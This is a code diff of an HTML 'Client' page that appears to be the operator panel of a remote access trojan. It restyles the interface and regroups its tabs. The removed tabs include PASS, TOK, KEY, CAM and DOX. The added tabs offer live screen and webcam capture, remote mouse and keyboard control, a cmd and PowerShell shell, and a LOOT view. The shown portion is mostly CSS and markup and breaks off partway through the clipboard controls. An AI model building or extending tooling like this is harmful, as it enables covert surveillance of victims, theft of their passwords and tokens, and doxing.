@@ -5,106 +5,97 @@
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <title>Client</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
 <style>
 *,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
-:root{--bg:#090b11;--surf:rgba(255,255,255,.03);--bord:rgba(255,255,255,.06);--txt:#e2e8f0;--txt2:rgba(255,255,255,.35);--acc:#818cf8;--acc2:#5864ff;--grn:#22c55e;--red:#ef4444;--org:#fb923c;--rd:10px}
-html{font-size:14.5px}
-body{background:var(--bg);color:var(--txt);font-family:'Inter',system-ui,sans-serif;min-height:100vh;overflow-x:hidden}
-body::before{content:'';position:fixed;top:-50%;left:-50%;width:200%;height:200%;background:radial-gradient(ellipse at 20% 50%,rgba(88,100,255,.03)0%,transparent 50%),radial-gradient(ellipse at 80% 20%,rgba(130,80,223,.025)0%,transparent 50%);pointer-events:none;z-index:0}
+:root{--bg:#0a0c12;--surface:rgba(255,255,255,.04);--border:rgba(255,255,255,.07);--text:#e2e8f0;--text2:rgba(255,255,255,.35);--accent:#818cf8;--green:#22c55e;--red:#ef4444;--orange:#fb923c;--radius:10px}
+html{font-size:14px}
+body{background:var(--bg);color:var(--text);font-family:'Inter',system-ui,sans-serif;min-height:100vh}
 ::-webkit-scrollbar{width:3px}
 ::-webkit-scrollbar-track{background:var(--bg)}
-::-webkit-scrollbar-thumb{background:rgba(255,255,255,.08);border-radius:10px}
+::-webkit-scrollbar-thumb{background:rgba(255,255,255,.1);border-radius:10px}
 ::selection{background:rgba(88,100,255,.3);color:#fff}
-.header{position:sticky;top:0;z-index:100;background:rgba(9,11,18,.88);backdrop-filter:blur(20px);border-bottom:1px solid var(--bord);padding:0 1.2rem;display:flex;align-items:center;height:50px;gap:.8rem}
-.header .back{color:var(--txt2);text-decoration:none;font-size:1rem;font-weight:700;width:30px;height:30px;display:flex;align-items:center;justify-content:center;border-radius:6px;transition:all .15s;flex-shrink:0}
+.header{position:sticky;top:0;z-index:100;background:rgba(10,12,18,.92);backdrop-filter:blur(16px);border-bottom:1px solid var(--border);padding:0 1.2rem;display:flex;align-items:center;height:48px;gap:.8rem}
+.header .back{color:var(--text2);text-decoration:none;font-size:1rem;font-weight:700;width:28px;height:28px;display:flex;align-items:center;justify-content:center;border-radius:6px;transition:all .15s;flex-shrink:0}
 .header .back:hover{color:#fff;background:rgba(255,255,255,.06)}
-.header h1{color:#f0f4fc;font-size:.9rem;font-weight:600;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
-.header .meta{color:var(--txt2);font-size:.7rem;margin-left:auto;white-space:nowrap}
-.main{padding:.7rem 1.2rem;max-width:1400px;margin:0 auto;position:relative;z-index:1}
-.tabs{display:flex;gap:.1rem;margin-bottom:.6rem;overflow-x:auto;overflow-y:hidden;border-bottom:1px solid var(--bord);padding-bottom:.15rem;scrollbar-width:none}
-.tabs::-webkit-scrollbar{display:none}
-.tab{background:transparent;color:var(--txt2);border:none;padding:.3rem.6rem;cursor:pointer;font-size:.73rem;font-weight:500;border-radius:6px 6px 0 0;transition:all .15s;white-space:nowrap;flex-shrink:0}
-.tab:hover{color:rgba(255,255,255,.6);background:rgba(255,255,255,.03)}
-.tab.active{color:var(--acc);background:rgba(88,100,255,.07);box-shadow:inset 0-1.5px 0 var(--acc)}
+.header h1{color:#f0f4fc;font-size:.85rem;font-weight:600;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.header .meta{color:var(--text2);font-size:.68rem;margin-left:auto;white-space:nowrap}
+.main{padding:.6rem 1rem;max-width:1400px;margin:0 auto}
+.tabs{display:flex;gap:.3rem;margin-bottom:.6rem;border-bottom:1px solid var(--border);padding-bottom:.1rem}
+.tab{background:transparent;color:var(--text2);border:none;padding:.3rem.7rem;cursor:pointer;font-size:.78rem;font-weight:500;border-radius:6px 6px 0 0;transition:all .15s;white-space:nowrap}
+.tab:hover{color:rgba(255,255,255,.6);background:rgba(255,255,255,.04)}
+.tab.active{color:var(--accent);background:rgba(88,100,255,.08);box-shadow:inset 0 -1.5px 0 var(--accent)}
 .panel{display:none;animation:pin .2s ease}
 .panel.active{display:block}
 @keyframes pin{from{opacity:0;transform:translateY(4px)}to{opacity:1;transform:translateY(0)}}
 .cmd-line{display:flex;gap:.4rem;margin-bottom:.4rem}
-.cmd-line input{flex:1;background:rgba(255,255,255,.04);border:1px solid var(--bord);border-radius:8px;padding:.45rem.7rem;color:var(--txt);font-family:'JetBrains Mono','SF Mono','Consolas',monospace;font-size:.78rem;outline:none;transition:border-color .2s}
-.cmd-line input:focus{border-color:rgba(88,100,255,.35)}
-.output{background:var(--surf);border:1px solid var(--bord);border-radius:var(--rd);padding:.7rem;color:var(--txt);font-family:'JetBrains Mono','SF Mono','Consolas',monospace;font-size:.75rem;min-height:220px;max-height:68vh;overflow-y:auto;white-space:pre-wrap;word-break:break-all;line-height:1.45}
-.img-out{max-width:100%;border-radius:var(--rd);border:1px solid var(--bord);display:block;background:#000}
-.smol{color:var(--txt2);font-size:.7rem;margin-top:.15rem}
-.loading{color:var(--txt2);text-align:center;padding:2rem;font-size:.82rem}
-.loading .sp{display:inline-block;width:16px;height:16px;border:2px solid rgba(255,255,255,.06);border-top-color:var(--acc);border-radius:50%;animation:sp .7s linear infinite;margin-right:.5rem;vertical-align:middle}
+.cmd-line input{flex:1;background:rgba(255,255,255,.04);border:1px solid var(--border);border-radius:8px;padding:.4rem.7rem;color:var(--text);font-family:'JetBrains Mono','SF Mono','Consolas',monospace;font-size:.78rem;outline:none}
+.cmd-line input:focus{border-color:rgba(88,100,255,.3)}
+.output{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:.7rem;color:var(--text);font-family:'JetBrains Mono','SF Mono','Consolas',monospace;font-size:.74rem;min-height:200px;max-height:65vh;overflow-y:auto;white-space:pre-wrap;word-break:break-all;line-height:1.4}
+.img-out{max-width:100%;border-radius:var(--radius);border:1px solid var(--border);display:block;background:#000}
+.loading{color:var(--text2);text-align:center;padding:2rem;font-size:.8rem}
+.loading .sp{display:inline-block;width:14px;height:14px;border:2px solid rgba(255,255,255,.06);border-top-color:var(--accent);border-radius:50%;animation:sp .7s linear infinite;margin-right:.5rem;vertical-align:middle}
 @keyframes sp{to{transform:rotate(360deg)}}
-.btn{border:none;padding:.35rem.75rem;border-radius:7px;cursor:pointer;font-size:.75rem;font-weight:600;transition:all .15s;display:inline-flex;align-items:center;gap:.35rem}
-.btn:active{transform:scale(.93)}
-.btn-p{background:linear-gradient(135deg,var(--grn),#16a34a);color:#fff;box-shadow:0 2px 8px rgba(34,197,94,.18)}
-.btn-p:hover{box-shadow:0 4px 16px rgba(34,197,94,.28);transform:translateY(-1px)}
-.btn-a{background:linear-gradient(135deg,var(--acc2),#7c3aed);color:#fff;box-shadow:0 2px 8px rgba(88,100,255,.18)}
-.btn-a:hover{box-shadow:0 4px 16px rgba(88,100,255,.28);transform:translateY(-1px)}
-.btn-d{background:linear-gradient(135deg,var(--red),#dc2626);color:#fff;box-shadow:0 2px 8px rgba(239,68,68,.18)}
-.btn-d:hover{box-shadow:0 4px 16px rgba(239,68,68,.28);transform:translateY(-1px)}
-.btn-g{background:rgba(255,255,255,.04);color:var(--txt2);border:1px solid var(--bord)}
-.btn-g:hover{background:rgba(255,255,255,.07);color:rgba(255,255,255,.65)}
-.btn-o{background:linear-gradient(135deg,var(--org),#f97316);color:#fff;box-shadow:0 2px 8px rgba(251,146,60,.18)}
-.btn-o:hover{box-shadow:0 4px 16px rgba(251,146,60,.28);transform:translateY(-1px)}
-.btn-pu{background:linear-gradient(135deg,#a78bfa,#7c3aed);color:#fff;box-shadow:0 2px 8px rgba(167,139,250,.18)}
-.btn-pu:hover{box-shadow:0 4px 16px rgba(167,139,250,.28);transform:translateY(-1px)}
-.btn-c{background:linear-gradient(135deg,#22d3ee,#06b6d4);color:#fff;box-shadow:0 2px 8px rgba(34,211,238,.18)}
-.btn-c:hover{box-shadow:0 4px 16px rgba(34,211,238,.28);transform:translateY(-1px)}
-.btn.active-on{outline:2px solid var(--acc);outline-offset:2px;background:rgba(88,100,255,.12)!important;border-color:rgba(88,100,255,.25)!important;color:var(--acc)!important}
-.btn-sm{padding:.22rem.5rem;font-size:.7rem}
-.btn-xs{padding:2px 5px;font-size:.58rem;border-radius:3px;background:rgba(255,255,255,.04);border:1px solid var(--bord);color:var(--txt2);cursor:pointer;transition:all .12s}
-.btn-xs:hover{background:rgba(255,255,255,.08);color:var(--txt)}
-.bar{display:flex;gap:.35rem;margin-bottom:.5rem;flex-wrap:wrap;align-items:center;padding:.4rem.7rem;background:var(--surf);border:1px solid var(--bord);border-radius:8px}
-.bar .lb{color:var(--txt2);font-size:.68rem;font-weight:500;text-transform:uppercase;letter-spacing:.04em;margin-right:.1rem}
-.bar .sp{color:var(--bord);margin:0.1rem}
-.err{color:#f87171;font-size:.73rem;padding:.4rem.7rem;background:rgba(239,68,68,.06);border:1px solid rgba(239,68,68,.15);border-radius:7px;margin-bottom:.4rem;display:none}
-.sel{background:rgba(0,0,0,.25);color:var(--txt);border:1px solid var(--bord);border-radius:7px;padding:.25rem.45rem;font-size:.75rem;outline:none;cursor:pointer;font-family:inherit}
-.sel:focus{border-color:rgba(88,100,255,.3)}
-.inp{background:rgba(255,255,255,.04);border:1px solid var(--bord);border-radius:7px;padding:.3rem.55rem;color:var(--txt);font-size:.75rem;outline:none;font-family:inherit;transition:border-color .2s}
+.btn{border:none;padding:.3rem.7rem;border-radius:6px;cursor:pointer;font-size:.75rem;font-weight:600;transition:all .12s;display:inline-flex;align-items:center;gap:.3rem;color:#fff}
+.btn:active{transform:scale(.94)}
+.btn-p{background:var(--green)}
+.btn-p:hover{filter:brightness(1.15)}
+.btn-a{background:var(--accent)}
+.btn-a:hover{filter:brightness(1.15)}
+.btn-d{background:var(--red)}
+.btn-d:hover{filter:brightness(1.15)}
+.btn-o{background:var(--orange)}
+.btn-o:hover{filter:brightness(1.15)}
+.btn-g{background:rgba(255,255,255,.06);color:var(--text2);border:1px solid var(--border)}
+.btn-g:hover{background:rgba(255,255,255,.1);color:rgba(255,255,255,.65)}
+.btn.active-on{outline:2px solid var(--accent);outline-offset:2px;background:rgba(88,100,255,.15)!important;border-color:rgba(88,100,255,.3)!important;color:var(--accent)!important}
+.btn-sm{padding:.2rem.45rem;font-size:.68rem}
+.btn-xs{padding:2px 4px;font-size:.55rem;border-radius:3px;background:rgba(255,255,255,.05);border:1px solid var(--border);color:var(--text2);cursor:pointer;transition:all .12s}
+.btn-xs:hover{background:rgba(255,255,255,.1);color:var(--text)}
+.bar{display:flex;gap:.35rem;margin-bottom:.5rem;flex-wrap:wrap;align-items:center;padding:.35rem.6rem;background:var(--surface);border:1px solid var(--border);border-radius:7px}
+.bar .lb{color:var(--text2);font-size:.65rem;font-weight:500;text-transform:uppercase;letter-spacing:.03em}
+.bar .sp{color:var(--border)}
+.err{color:#f87171;font-size:.72rem;padding:.35rem.6rem;background:rgba(239,68,68,.06);border:1px solid rgba(239,68,68,.15);border-radius:6px;margin-bottom:.4rem;display:none}
+.sel{background:rgba(0,0,0,.25);color:var(--text);border:1px solid var(--border);border-radius:6px;padding:.2rem.4rem;font-size:.75rem;outline:none;cursor:pointer;font-family:inherit}
+.inp{background:rgba(255,255,255,.04);border:1px solid var(--border);border-radius:6px;padding:.25rem.5rem;color:var(--text);font-size:.75rem;outline:none;font-family:inherit}
 .inp:focus{border-color:rgba(88,100,255,.3)}
-.files{background:var(--surf);border:1px solid var(--bord);border-radius:var(--rd);min-height:220px;max-height:68vh;overflow-y:auto;font-family:'JetBrains Mono','SF Mono','Consolas',monospace;font-size:.74rem}
-.files .path{background:rgba(0,0,0,.2);border-bottom:1px solid var(--bord);padding:.3rem.7rem;color:var(--acc);display:flex;align-items:center;gap:.4rem;border-radius:var(--rd) var(--rd) 0 0;position:sticky;top:0;z-index:2;font-size:.7rem}
+.scroll-out{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:.6rem;font-family:'JetBrains Mono','SF Mono','Consolas',monospace;font-size:.72rem;min-height:140px;max-height:60vh;overflow-y:auto;white-space:pre-wrap;word-break:break-all;line-height:1.4}
+.files{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);min-height:200px;max-height:65vh;overflow-y:auto;font-family:'JetBrains Mono','SF Mono','Consolas',monospace;font-size:.72rem}
+.files .path{background:rgba(0,0,0,.25);border-bottom:1px solid var(--border);padding:.25rem.6rem;color:var(--accent);display:flex;align-items:center;gap:.4rem;border-radius:var(--radius) var(--radius) 0 0;position:sticky;top:0;z-index:2;font-size:.68rem}
 .files .path span{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
-.files .entry{padding:.25rem.7rem;display:flex;align-items:center;gap:.4rem;border-bottom:1px solid rgba(255,255,255,.02);transition:background .08s}
+.files .entry{padding:.2rem.6rem;display:flex;align-items:center;gap:.4rem;border-bottom:1px solid rgba(255,255,255,.02);transition:background .08s;font-size:.72rem}
 .files .entry:last-child{border-bottom:none}
 .files .entry:hover{background:rgba(88,100,255,.04)}
-.files .entry .ico{flex-shrink:0;width:1rem;text-align:center;font-size:.78rem}
-.files .entry .ico.f{color:var(--org)}
+.files .entry .ico{flex-shrink:0;width:1rem;text-align:center;font-size:.75rem}
+.files .entry .ico.f{color:var(--orange)}
 .files .entry .ico.fl{color:rgba(255,255,255,.2)}
-.files .entry .nm{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;cursor:default;color:var(--txt)}
+.files .entry .nm{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;cursor:default}
 .files .entry.dir .nm{cursor:pointer;color:#f0f4fc}
-.files .entry.dir .nm:hover{color:var(--acc)}
-.files .entry .sz{color:var(--txt2);font-size:.65rem;white-space:nowrap;min-width:4rem;text-align:right}
-.files .entry .dt{color:var(--txt2);font-size:.65rem;white-space:nowrap;min-width:6.5rem;text-align:right}
+.files .entry.dir .nm:hover{color:var(--accent)}
+.files .entry .sz{color:var(--text2);font-size:.6rem;white-space:nowrap;min-width:3.5rem;text-align:right}
+.files .entry .dt{color:var(--text2);font-size:.6rem;white-space:nowrap;min-width:6rem;text-align:right}
 .files .entry .acts{display:flex;gap:2px;flex-shrink:0;opacity:0;transition:opacity .1s}
 .files .entry:hover .acts{opacity:1}
-.drop-zone{border:2px dashed var(--bord);border-radius:8px;padding:.4rem.7rem;text-align:center;font-size:.7rem;color:var(--txt2);margin-bottom:.5rem;transition:all .2s;cursor:pointer;position:relative}
-.drop-zone.drag{border-color:var(--acc);background:rgba(129,140,248,.06);color:var(--acc)}
-.proc-t{width:100%;border-collapse:collapse;font-family:'JetBrains Mono','SF Mono','Consolas',monospace;font-size:.72rem}
-.proc-t th{background:rgba(0,0,0,.2);color:var(--txt2);padding:.3rem.6rem;text-align:left;border-bottom:1px solid var(--bord);position:sticky;top:0;font-weight:600;font-size:.65rem;text-transform:uppercase;letter-spacing:.05em}
-.proc-t td{padding:.2rem.6rem;border-bottom:1px solid rgba(255,255,255,.02)}
-.proc-t tr:hover{background:rgba(88,100,255,.03)}
-.proc-t .pid{color:var(--txt2);width:4rem}
-.proc-t .pnm{color:var(--txt)}
-.proc-t .pkl{width:3rem;text-align:center}
-.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:.6rem}
-.card{background:var(--surf);border:1px solid var(--bord);border-radius:9px;padding:.7rem}
-.card .v{font-size:1rem;font-weight:700;color:#f0f4fc}
-.card .l{color:var(--txt2);font-size:.68rem;margin-top:.08rem;font-weight:500;text-transform:uppercase;letter-spacing:.04em}
+.drop-zone{border:2px dashed var(--border);border-radius:7px;padding:.35rem.6rem;text-align:center;font-size:.68rem;color:var(--text2);margin-bottom:.4rem;transition:all .2s;cursor:pointer;position:relative}
+.drop-zone.drag{border-color:var(--accent);background:rgba(129,140,248,.06);color:var(--accent)}
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(130px,1fr));gap:.4rem}
+.card{background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:.5rem}
+.card .v{font-size:.9rem;font-weight:700;color:#f0f4fc}
+.card .l{color:var(--text2);font-size:.65rem;margin-top:.05rem;font-weight:500;text-transform:uppercase;letter-spacing:.03em}
 .disk-bar{height:3px;background:rgba(0,0,0,.3);border-radius:2px;margin-top:.2rem;overflow:hidden}
-.disk-bar .fill{height:100%;background:linear-gradient(90deg,var(--acc2),var(--acc));border-radius:2px;transition:width .4s}
-.scroll-out{background:var(--surf);border:1px solid var(--bord);border-radius:var(--rd);padding:.7rem;font-family:'JetBrains Mono','SF Mono','Consolas',monospace;font-size:.74rem;min-height:160px;max-height:62vh;overflow-y:auto;white-space:pre-wrap;word-break:break-all;line-height:1.4}
-.toast{position:fixed;bottom:1.2rem;right:1.2rem;background:linear-gradient(135deg,var(--grn),#16a34a);color:#fff;padding:.45rem.9rem;border-radius:8px;font-size:.78rem;font-weight:600;z-index:999;animation:tup .25s ease;pointer-events:none;box-shadow:0 8px 25px rgba(34,197,94,.2)}
+.disk-bar .fill{height:100%;background:linear-gradient(90deg,var(--accent),#7c3aed);border-radius:2px;transition:width .4s}
+.toast{position:fixed;bottom:1.2rem;right:1.2rem;background:var(--green);color:#000;padding:.4rem.8rem;border-radius:7px;font-size:.75rem;font-weight:600;z-index:999;animation:tup .25s ease;pointer-events:none}
 @keyframes tup{from{opacity:0;transform:translateY(12px)scale(.95)}to{opacity:1;transform:translateY(0)scale(1)}}
+.loot-grid{display:grid;grid-template-columns:1fr 1fr;gap:.5rem}
+.loot-card{background:var(--surface);border:1px solid var(--border);border-radius:8px;overflow:hidden}
+.loot-card .head{display:flex;align-items:center;justify-content:space-between;padding:.35rem.55rem;border-bottom:1px solid var(--border);font-size:.72rem;font-weight:600;color:var(--text2)}
+.loot-card .head .btn{padding:.15rem.4rem;font-size:.62rem}
+.loot-card .body{padding:.35rem.55rem;min-height:60px;max-height:200px;overflow-y:auto;font-size:.7rem;font-family:'JetBrains Mono','SF Mono','Consolas',monospace;white-space:pre-wrap;word-break:break-all;line-height:1.35;color:var(--text)}
+.loot-card .body .loading{font-family:'Inter',system-ui,sans-serif}
 @media(max-width:768px){
-.header .meta{display:none}.main{padding:.5rem}.tabs{overflow-x:auto}
-.tab{padding:.25rem.45rem;font-size:.7rem}.bar{padding:.3rem}
-.files .entry .dt{display:none}.grid{grid-template-columns:1fr 1fr}
+.header .meta{display:none}.main{padding:.4rem}
+.loot-grid{grid-template-columns:1fr}.files .entry .dt{display:none}
+.grid{grid-template-columns:1fr 1fr}
 }
 </style>
 </head>
@@ -116,291 +107,242 @@ body::before{content:'';position:fixed;top:-50%;left:-50%;width:200%;height:200%
 </div>
 <div class="main">
   <div class="tabs" id="tabBar">
-    <div class="tab" data-tab="cmd">CMD</div>
-    <div class="tab" data-tab="ss">SCREEN</div>
-    <div class="tab" data-tab="live">LIVE</div>
-    <div class="tab" data-tab="proc">PROC</div>
-    <div class="tab" data-tab="sys">SYS</div>
-    <div class="tab" data-tab="pw">PASS</div>
-    <div class="tab" data-tab="net">NET</div>
-    <div class="tab" data-tab="svc">SVC</div>
-    <div class="tab" data-tab="app">APPS</div>
-    <div class="tab" data-tab="files">FILE</div>
-    <div class="tab" data-tab="cam">CAM</div>
-    <div class="tab" data-tab="tokens">TOK</div>
-    <div class="tab" data-tab="host">HOST</div>
-    <div class="tab" data-tab="keylog">KEY</div>
-    <div class="tab" data-tab="log">LOG</div>
-    <div class="tab" data-tab="settings">SET</div>
-    <div class="tab" data-tab="dox" style="color:var(--red);font-weight:700">DOX</div>
-    <div class="tab" data-tab="intel">INTEL</div>
+    <div class="tab active" data-tab="live">LIVE</div>
+    <div class="tab" data-tab="shell">SHELL</div>
+    <div class="tab" data-tab="files">FILES</div>
+    <div class="tab" data-tab="loot">LOOT</div>
+    <div class="tab" data-tab="config">CONFIG</div>
   </div>
 
-  <div class="panel active" id="p-cmd">
+  <!-- LIVE: Screen + Webcam + Stream + Mouse/Keyboard -->
+  <div class="panel active" id="p-live">
+    <div class="bar">
+      <span class="lb">Captures</span>
+      <select class="sel" id="monSel" style="width:50px"><option value="0">M1</option><option value="-1">All</option></select>
+      <button class="btn btn-p btn-sm" onclick="takeSS()">Screenshot</button>
+      <button class="btn btn-a btn-sm" onclick="takeCam()">Webcam</button>
+      <span class="sp">|</span>
+      <button class="btn btn-p btn-sm" id="liveStart" onclick="startLive()">▶ Live</button>
+      <button class="btn btn-d btn-sm" id="liveStop" onclick="stopLive()" style="display:none">■ Stop</button>
+      <span id="fps" style="color:var(--text2);font-size:.65rem;min-width:2.5rem;text-align:right">0 fps</span>
+    </div>
+    <div class="bar">
+      <span class="lb">Quality</span>
+      <input type="range" id="liveQ" min="5" max="50" value="25" style="width:50px;accent-color:var(--accent);height:2px" oninput="lq.textContent=this.value;sendLiveCfg()">
+      <span id="lq" style="color:var(--text2);font-size:.6rem;min-width:1rem">25</span>
+      <span class="lb">Scale</span>
+      <select class="sel" id="liveS" style="width:50px" onchange="sendLiveCfg()">
+        <option value="0.25">25%</option><option value="0.5" selected>50%</option><option value="0.75">75%</option><option value="1">100%</option>
+      </select>
+      <span class="lb">Mon</span>
+      <select class="sel" id="liveMon" style="width:50px"><option>0</option><option>1</option><option>2</option><option>3</option></select>
+      <span class="lb" style="margin-left:auto">Mouse</span>
+      <button class="btn btn-g btn-sm" id="mouseBtn" onclick="tgMouse()">OFF</button>
+      <span class="lb">Keys</span>
+      <button class="btn btn-g btn-sm" id="keyBtn" onclick="tgKey()">OFF</button>
+    </div>
+    <div id="keyTypeOut" class="bar" style="display:none;flex-wrap:wrap;gap:3px">
+      <input class="inp" id="keyTypeIn" placeholder="Type here..." style="flex:1;min-width:100px;font-size:.72rem" spellcheck="false" oninput="for(let c of this.value)sendKeyType(c);this.value=''">
+      <button class="btn btn-g btn-sm" style="font-size:.55rem;padding:1px 4px" onclick="sendKeySpecial(13)">Enter</button>
+      <button class="btn btn-g btn-sm" style="font-size:.55rem;padding:1px 4px" onclick="sendKeySpecial(9)">Tab</button>
+      <button class="btn btn-g btn-sm" style="font-size:.55rem;padding:1px 4px" onclick="sendKeySpecial(8)">Bksp</button>
+      <button class="btn btn-g btn-sm" style="font-size:.55rem;padding:1px 4px" onclick="sendKeySpecial(46)">Del</button>
+      <button class="btn btn-g btn-sm" style="font-size:.55rem;padding:1px 4px" onclick="sendKeySpecial(27)">Esc</button>
+      <button class="btn btn-g btn-sm" style="font-size:.55rem;padding:1px 4px" onclick="sendKeySpecial(37)">&#9664;</button>
+      <button class="btn btn-g btn-sm" style="font-size:.55rem;padding:1px 4px" onclick="sendKeySpecial(38)">&#9650;</button>
+      <button class="btn btn-g btn-sm" style="font-size:.55rem;padding:1px 4px" onclick="sendKeySpecial(39)">&#9654;</button>
+      <button class="btn btn-g btn-sm" style="font-size:.55rem;padding:1px 4px" onclick="sendKeySpecial(40)">&#9660;</button>
+    </div>
+    <div id="liveOut"><div class="loading">Start live or capture</div></div>
+    <div id="ssErr" class="err"></div>
+    <div id="camErr" class="err"></div>
+  </div>
+
+  <!-- SHELL: CMD + Powershell + Processes -->
+  <div class="panel" id="p-shell">
     <div class="cmd-line">
       <input id="cmdIn" placeholder="cmd..." onkeydown="if(event.key==='Enter')runCmd()" autofocus spellcheck="false">
       <button class="btn btn-a btn-sm" onclick="runCmd()">Run</button>
-      <button class="btn btn-g btn-sm" onclick="copyCmdOut()" title="Copy output">📋</button>
+      <button class="btn btn-g btn-sm" onclick="copyCmdOut()" title="Copy">📋</button>
       <button class="btn btn-g btn-sm" onclick="clrCmd()" title="Clear">✕</button>
     </div>
     <div class="output" id="cmdOut">Ready.</div>
     <div id="cmdErr" class="err"></div>
-  </div>
-
-  <div class="panel" id="p-ss">
-    <div class="bar">
-      <span class="lb">Monitor:</span>
-      <select class="sel" id="monSel"><option value="0">1</option><option value="-1">All</option></select>
-      <button class="btn btn-p btn-sm" onclick="takeSS()">Capture</button>
-    </div>
-    <div id="ssOut"><div class="loading">Click Capture</div></div>
-    <div id="ssErr" class="err"></div>
-  </div>
-
-  <div class="panel" id="p-live">
-    <div class="bar">
-      <button class="btn btn-p btn-sm" id="liveStart" onclick="startLive()">▶ Start</button>
-      <button class="btn btn-d btn-sm" id="liveStop" onclick="stopLive()" style="display:none">■ Stop</button>
+    <div class="bar" style="margin-top:.4rem">
+      <span class="lb">PS</span>
+      <input class="inp" id="psIn" placeholder="powershell..." style="flex:1;max-width:250px" spellcheck="false">
+      <button class="btn btn-a btn-sm" onclick="runPS()">Run PS</button>
       <span class="sp">|</span>
-      <span class="lb">Mon:</span>
-      <select class="sel" id="liveMon" style="width:60px"><option>0</option><option>1</option><option>2</option><option>3</option></select>
-      <span class="lb">Q:</span>
-      <input type="range" id="liveQ" min="5" max="50" value="25" style="width:50px;vertical-align:middle" oninput="lq.textContent=this.value;sendLiveCfg()">
-      <span id="lq" style="color:var(--txt2);font-size:.65rem;min-width:1.2rem">25</span>
-      <span class="lb">S:</span>
-      <select class="sel" id="liveS" style="width:55px" onchange="sendLiveCfg()">
-        <option value="0.25">25%</option><option value="0.5" selected>50%</option><option value="0.75">75%</option><option value="1">100%</option>
-      </select>
-      <span class="lb" style="margin-left:auto">Mouse:</span>
-      <button class="btn btn-g btn-sm" id="mouseBtn" onclick="tgMouse()">OFF</button>
-      <span class="lb">Key:</span>
-      <button class="btn btn-g btn-sm" id="keyBtn" onclick="tgKey()">OFF</button>
-      <span id="fps" style="color:var(--txt2);font-size:.68rem;min-width:3rem;text-align:right">0 fps</span>
-    </div>
-    <div id="keyTypeOut" class="bar" style="display:none;flex-wrap:wrap;gap:4px;align-items:center">
-      <span class="lb" style="font-size:.65rem">Type:</span>
-      <input class="inp" id="keyTypeIn" placeholder="Type here..." style="flex:1;min-width:120px;max-width:300px;font-size:.75rem" spellcheck="false" oninput="for(let c of this.value)sendKeyType(c);this.value=''">
-      <span class="sp">|</span>
-      <button class="btn btn-g btn-sm" style="font-size:.6rem;padding:1px 5px" onclick="sendKeySpecial(13)">Enter</button>
-      <button class="btn btn-g btn-sm" style="font-size:.6rem;padding:1px 5px" onclick="sendKeySpecial(9)">Tab</button>
-      <button class="btn btn-g btn-sm" style="font-size:.6rem;padding:1px 5px" onclick="sendKeySpecial(8)">Bksp</button>
-      <button class="btn btn-g btn-sm" style="font-size:.6rem;padding:1px 5px" onclick="sendKeySpecial(46)">Del</button>
-      <button class="btn btn-g btn-sm" style="font-size:.6rem;padding:1px 5px" onclick="sendKeySpecial(27)">Esc</button>
-      <button class="btn btn-g btn-sm" style="font-size:.6rem;padding:1px 5px" onclick="sendKeySpecial(37)">&#9664;</button>
-      <button class="btn btn-g btn-sm" style="font-size:.6rem;padding:1px 5px" onclick="sendKeySpecial(38)">&#9650;</button>
-      <button class="btn btn-g btn-sm" style="font-size:.6rem;padding:1px 5px" onclick="sendKeySpecial(39)">&#9654;</button>
-      <button class="btn btn-g btn-sm" style="font-size:.6rem;padding:1px 5px" onclick="sendKeySpecial(40)">&#9660;</button>
-    </div>
-    <div id="liveOut"><div class="loading">Start live view</div></div>
-  </div>
-
-  <div class="panel" id="p-proc">
-    <div class="bar">
-      <button class="btn btn-p btn-sm" onclick="loadProc()">⟳ Refresh</button>
-      <input class="inp" id="procSearch" placeholder="Search..." style="flex:1;min-width:80px;max-width:200px" oninput="filterProc()" spellcheck="false">
-      <span id="procCnt" style="color:var(--txt2);font-size:.7rem"></span>
+      <span class="lb">Processes</span>
+      <button class="btn btn-p btn-sm" onclick="loadProc()">⟳</button>
+      <input class="inp" id="procSearch" placeholder="Search..." style="flex:1;max-width:150px" oninput="filterProc()" spellcheck="false">
+      <span id="procCnt" style="color:var(--text2);font-size:.65rem"></span>
     </div>
     <div id="procOut"><div class="loading">Load processes</div></div>
     <div id="procErr" class="err"></div>
   </div>
 
-  <div class="panel" id="p-sys">
-    <div class="bar">
-      <span class="lb">Power:</span>
-      <button class="btn btn-d btn-sm" onclick="sysCmd('shutdown')">Shutdown</button>
-      <button class="btn btn-o btn-sm" onclick="sysCmd('restart')">Restart</button>
-      <button class="btn btn-g btn-sm" onclick="sysCmd('lock')">Lock</button>
-      <button class="btn btn-g btn-sm" onclick="sysCmd('logoff')">Logoff</button>
-      <span class="sp">|</span>
-      <button class="btn btn-a btn-sm" onclick="showMsg()">MsgBox</button>
-      <button class="btn btn-g btn-sm" onclick="getClip()">Clip</button>
-      <button class="btn btn-g btn-sm" onclick="getIdle()">Idle</button>
-      <button class="btn btn-g btn-sm" onclick="getUp()">Uptime</button>
-    </div>
-    <div class="bar">
-      <span class="lb">Vol:</span>
-      <input type="range" id="volSl" min="0" max="100" value="50" style="flex:1;max-width:120px;accent-color:var(--acc);height:3px" oninput="volD.textContent=this.value">
-      <span id="volD" style="color:var(--txt);font-size:.75rem;width:2rem">50</span>
-      <button class="btn btn-g btn-sm" onclick="sendVol()">Set</button>
-      <span class="sp">|</span>
-      <span class="lb">Wall:</span>
-      <input class="inp" id="wallIn" placeholder="C:\path\img.jpg" style="flex:1;max-width:160px">
-      <button class="btn btn-a btn-sm" onclick="setWall()">Set</button>
-    </div>
-    <div class="bar">
-      <span class="lb">Clip:</span>
-      <input class="inp" id="clipIn" placeholder="Write text to clipboard..." style="flex:1;max-width:220px">
-      <button class="btn btn-a btn-sm" onclick="setClip()">Write</button>
-      <span class="sp">|</span>
